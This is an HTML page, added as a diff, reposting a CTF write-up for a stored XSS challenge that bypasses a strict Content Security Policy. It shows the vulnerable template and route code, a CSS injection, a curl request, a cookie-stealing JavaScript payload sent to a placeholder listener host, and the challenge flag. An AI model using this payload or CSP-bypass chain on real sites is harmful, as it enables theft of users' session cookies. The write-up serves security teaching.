@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="This is a stored XSS challenge with a strict Content Security Policy. The solution turns a user-controlled note title into JavaScript served from the same origin, forces the admin bot to visit the unsafe profile page, and navigates the bot to a listener with its flag cookie.">
+  <title>crazy notes | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 3 / HARD</p>
+    <h1>crazy notes</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>This is a stored XSS challenge with a strict Content Security Policy. The solution turns a user-controlled note title into JavaScript served from the same origin, forces the admin bot to visit the unsafe profile page, and navigates the bot to a listener with its flag cookie.</p>
+<h2>Vulnerable code</h2>
+<p>The profile template disables escaping at <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/src/app/templates/profile.html"><code>src/app/templates/profile.html</code></a>, line 19:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-jinja">&lt;p class=&quot;muted&quot;&gt;{{ bio | safe }}&lt;/p&gt;
+</code></pre>
+<p>Normally, a script in the bio would be blocked by the CSP defined in <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/src/app/app.py"><code>src/app/app.py</code></a>, line 12, because <code>script-src</code> only permits the same origin and DOMPurify's CDN.</p>
+<p>There is a same-origin script gadget at <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/src/app/app.py"><code>src/app/app.py</code></a>, lines 202-215:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-python">c.execute('SELECT id, title, visit_count FROM notes WHERE id=?', (note_id,))
+...
+return f&quot;Note: {note[1]}, Visit Count: {note[2]}&quot;
+</code></pre>
+<p>The title is user controlled and is returned without JavaScript escaping. The response also lacks <code>X-Content-Type-Options</code>, allowing the browser to treat a valid JavaScript-looking response as a script when loaded with a script src tag.</p>
+<p>Finally, a stored CSS injection makes the bot take its error path. The color is saved without validation at <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/src/app/app.py"><code>src/app/app.py</code></a>, lines 170-180, and inserted into a style attribute at <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/src/app/templates/notes.html"><code>src/app/templates/notes.html</code></a>, line 25:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-html">&lt;button id=&quot;view-btn&quot; ... style=&quot;background-color: {{ color_input }}&quot;&gt;View Random Note&lt;/button&gt;
+</code></pre>
+<p>The bot tries to click this element. If the click times out, <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave3/xss_hard/src/bot/bot.js"><code>src/bot/bot.js</code></a>, lines 50-60, sends the logged-in admin to the attacker profile.</p>
+<h2>Exploit</h2>
+<p>Assume your user ID is <code>USER_ID</code> and the note ID is <code>NOTE_ID</code>.</p>
+<ol>
+<li>Save this button color:</li>
+</ol>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">red;display:none
+</code></pre>
+<p>The rendered style becomes background-color red followed by display none, hiding the button. For example:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-bash">curl -b cookies.txt -X POST \
+  https://crazy-notes.web2.friendly-ctf.securinets.tn/user/USER_ID/preferences/button-color \
+  --data-urlencode 'color=red;display:none'
+</code></pre>
+<ol start="2">
+<li>Create a note with any content and this title, replacing <code>LISTENER</code> with a request bin or your server:</li>
+</ol>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-javascript">;window.location='https://LISTENER/?c='+encodeURIComponent(document.cookie);//
+</code></pre>
+<p>this would bypass the csp cz the <code>navigate-to</code> directive was not defined and set to self for exp to block navigation to external servers</p>
+<ol start="3">
+<li>Set your bio to:</li>
+</ol>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-html">&lt;script src=&quot;/note/NOTE_ID/stats&quot;&gt;&lt;/script&gt;
+</code></pre>
+<p>This satisfies <code>script-src</code> because the script URL is on the target origin. The stats endpoint returns source beginning with:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-javascript">Note: ;window.location='https://LISTENER/?c='+encodeURIComponent(document.cookie);//
+</code></pre>
+<p>The initial Note label is valid JavaScript and the leading semicolon starts the payload. The final double slash comments out the rest of the stats text.</p>
+<ol start="4">
+<li>Trigger the admin bot from the profile page. It first opens your notes, cannot click the hidden button, catches a timeout, and then visits your profile. The profile loads the same-origin gadget and the JavaScript navigates to your listener with the flag cookie.</li>
+</ol>
+<p>The CSP blocks fetch requests to external origins through <code>connect-src</code>, but it does not restrict top-level navigation here. The policy also has no effective navigation restriction, so assigning <code>window.location</code> works.</p>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{s0me_fun_f0r_xss_f4ns}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave3">&larr; Back to Wave 3 writeups</a></p>
+  </main>
+</body>
+</html>
